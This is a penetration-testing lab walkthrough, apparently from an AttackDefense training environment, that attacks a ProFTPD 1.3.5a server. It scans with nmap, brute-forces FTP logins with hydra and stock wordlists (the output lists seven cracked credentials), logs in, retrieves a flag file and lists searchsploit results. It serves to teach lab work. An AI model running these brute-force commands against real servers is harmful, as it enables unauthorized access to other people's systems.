# Exploiting FTP

```bash
# Check which port FTP running
nmap -sV 192.16.25.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-18 10:07 IST
Nmap scan report for demo.ine.local (192.16.25.3)
Host is up (0.000024s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5a
MAC Address: 02:42:C0:10:19:03 (Unknown)
Service Info: OS: Unix

# Try to log in anonyously
└─# ftp 192.16.25.3                                                       
Connected to 192.16.25.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.16.25.3]
Name (192.16.25.3:root): anonymous
331 Password required for anonymous
Password: 
530 Login incorrect.
ftp: Login failed        <- failed(need username and password)
```

```bash
# List nmap commands available for FTP
└─# ls -al /usr/share/nmap/scripts/ | grep ftp-*                          
-rw-r--r-- 1 root root  4530 Jun 20  2024 ftp-anon.nse
-rw-r--r-- 1 root root  3253 Jun 20  2024 ftp-bounce.nse
-rw-r--r-- 1 root root  3108 Jun 20  2024 ftp-brute.nse
-rw-r--r-- 1 root root  3272 Jun 20  2024 ftp-libopie.nse
-rw-r--r-- 1 root root  3290 Jun 20  2024 ftp-proftpd-backdoor.nse
-rw-r--r-- 1 root root  3768 Jun 20  2024 ftp-syst.nse
-rw-r--r-- 1 root root  6021 Jun 20  2024 ftp-vsftpd-backdoor.nse
-rw-r--r-- 1 root root  5923 Jun 20  2024 ftp-vuln-cve2010-4221.nse
-rw-r--r-- 1 root root  5736 Jun 20  2024 tftp-enum.nse
-rw-r--r-- 1 root root 10034 Jun 20  2024 tftp-version.nse
```
```bash
# Bruteforce
─# hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.16.25.3 -t 4 ftp
[DATA] attacking ftp://192.16.25.3:21/
[21][ftp] host: 192.16.25.3   login: sysadmin   password: 654321
[21][ftp] host: 192.16.25.3   login: rooty   password: qwerty
[21][ftp] host: 192.16.25.3   login: demo   password: butterfly
[STATUS] 3052.00 tries/min, 3052 tries in 00:01h, 4011 to do in 00:02h, 4 active
[21][ftp] host: 192.16.25.3   login: auditor   password: chocolate
[21][ftp] host: 192.16.25.3   login: anon   password: purple
[STATUS] 2550.00 tries/min, 5100 tries in 00:02h, 1963 to do in 00:01h, 4 active
[21][ftp] host: 192.16.25.3   login: administrator   password: tweety
[21][ftp] host: 192.16.25.3   login: diag   password: tigger
1 of 1 target successfully completed, 7 valid passwords found
```

```bash
# Log in (auditor:chocolate)
└─# ftp 192.16.25.3                                                       
Connected to 192.16.25.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.16.25.3]
Name (192.16.25.3:root): auditor
331 Password required for auditor
Password: 
230 User auditor logged in
Remote system type is UNIX.
Using binary mode to transfer files.
```

```bash
# Find flag
ftp> ls
229 Entering Extended Passive Mode (|||43400|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20  2018 secret.txt
226 Transfer complete
ftp> get secret.txt
local: secret.txt remote: secret.txt
229 Entering Extended Passive Mode (|||21014|)
150 Opening BINARY mode data connection for secret.txt (33 bytes)
100% |*****************************|    33      644.53 KiB/s    00:00 ETA
226 Transfer complete
33 bytes received in 00:00 (81.58 KiB/s)

└─# cat secret.txt                                                        
098f6bcd4621d373cade4e832627b4f6
```

```bash
# List available modules on Metasploit
└─# searchsploit ProFTP                                                   
---------------------------------------- ---------------------------------
 Exploit Title                          |  Path
---------------------------------------- ---------------------------------
FreeBSD - 'ftpd / ProFTPd' Remote Comma | freebsd/remote/18181.txt
ProFTP 2.9 - Banner Remote Buffer Overf | windows/remote/16709.rb
ProFTP 2.9 - Welcome Message Remote Buf | windows/remote/9508.rb
ProFTPd - 'ftpdctl' 'pr_ctrls_connect'  | linux/local/394.c
ProFTPd - 'mod_mysql' Authentication By | multiple/remote/8037.txt
ProFTPd - 'mod_sftp' Integer Overflow D | linux/dos/16129.txt
ProFTPd 1.2 - 'SIZE' Remote Denial of S | linux/dos/20536.java
ProFTPd 1.2 < 1.3.0 (Linux) - 'sreplace | linux/remote/16852.rb
~~~~~~~~~~~~~~
```
